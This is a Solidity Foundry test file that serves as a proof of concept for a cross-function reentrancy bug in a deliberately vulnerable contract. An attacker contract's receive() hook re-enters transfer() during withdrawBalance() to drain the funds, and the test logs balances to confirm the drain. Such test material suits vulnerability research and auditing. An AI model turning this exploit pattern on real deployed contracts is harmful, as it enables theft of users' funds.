// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_cross_function.sol";

contract ReentrancyCrossFunctionTest is Test {
    Reentrancy_cross_function public vulnerable;
    AttackerContract public attacker;
    address public constant RECIPIENT = address(0xABCD);
    address public constant DONOR = address(0x1234);

    function setUp() public {
        vulnerable = new Reentrancy_cross_function();
        attacker = new AttackerContract(vulnerable, RECIPIENT);
        
        // Setup initial funds for attack
        vm.deal(address(attacker), 1 ether); // For deposit
        vm.deal(DONOR, 1 ether); // For blockchain balance checks
    }

    function testCrossFunctionReentrancy() public {
        // Attacker makes initial deposit
        vm.startPrank(address(attacker));
        vulnerable.deposit{value: 1 ether}();
        vm.stopPrank();

        // Verify initial state
        assertEq(vulnerable.getBalance(address(attacker)), 1 ether, "Attacker should have initial deposit");
        assertEq(address(vulnerable).balance, 1 ether, "Vulnerable contract should hold deposit");

        // Fast-forward to bypass withdrawal cooldown
        skip(1 days);

        // Pre-attack state logging
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 vulnerableEthBefore = address(vulnerable).balance;
        uint256 attackerTokenBefore = vulnerable.getBalance(address(attacker));
        uint256 recipientTokenBefore = vulnerable.getBalance(RECIPIENT);
        uint256 attackerEthBefore = address(attacker).balance;
        
        console2.log("Vulnerable contract ETH balance:", vulnerableEthBefore);
        console2.log("Attacker token balance in vulnerable:", attackerTokenBefore);
        console2.log("Recipient token balance:", recipientTokenBefore);
        console2.log("Attacker contract ETH balance:", attackerEthBefore);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();

        console2.log("--- AFTER-Trigger Attack ---");
        // Post-attack state logging
        uint256 vulnerableEthAfter = address(vulnerable).balance;
        uint256 attackerTokenAfter = vulnerable.getBalance(address(attacker));
        uint256 recipientTokenAfter = vulnerable.getBalance(RECIPIENT);
        uint256 attackerEthAfter = address(attacker).balance;
        
        console2.log("Vulnerable contract ETH balance:", vulnerableEthAfter);
        console2.log("Attacker token balance in vulnerable:", attackerTokenAfter);
        console2.log("Recipient token balance:", recipientTokenAfter);
        console2.log("Attacker contract ETH balance:", attackerEthAfter);
        
        // Differential validation
        console2.log("--- Differential Validation Result ---");
        console2.log("ETH change in vulnerable contract: %d -> %d", vulnerableEthBefore, vulnerableEthAfter);
        console2.log("Token change for attacker: %d -> %d", attackerTokenBefore, attackerTokenAfter);
        console2.log("Token change for recipient: %d -> %d", recipientTokenBefore, recipientTokenAfter);
        console2.log("ETH change for attacker contract: %d -> %d", attackerEthBefore, attackerEthAfter);

        // Check for vulnerability indicators
        bool vulnerableEmptied = (vulnerableEthAfter == 0);
        bool fundsMovedToRecipient = (recipientTokenAfter == 1 ether);
        bool fundsMovedToAttacker = (attackerEthAfter == 1 ether);
        bool attackerBalanceZeroed = (attackerTokenAfter == 0);
        
        bool exploitationSuccess = vulnerableEmptied && fundsMovedToRecipient && fundsMovedToAttacker && attackerBalanceZeroed;
        
        // Final vulnerability verdict
        if (exploitationSuccess) {
            console2.log("Vulnerability Exists: Attack successfully drained vulnerable contract");
        } else {
            console2.log("Vulnerability not Exist: State changes don't indicate successful exploitation");
        }
    }
}

contract AttackerContract {
    Reentrancy_cross_function public vulnerable;
    address public recipient;

    constructor(Reentrancy_cross_function _vulnerable, address _recipient) {
        vulnerable = _vulnerable;
        recipient = _recipient;
    }

    function attack() public {
        vulnerable.withdrawBalance();
    }

    receive() external payable {
        // Only execute reentrancy if we have remaining funds in accounting
        uint attackerBalance = vulnerable.getBalance(address(this));
        if (attackerBalance > 0) {
            vulnerable.transfer(recipient, attackerBalance);
        }
    }
}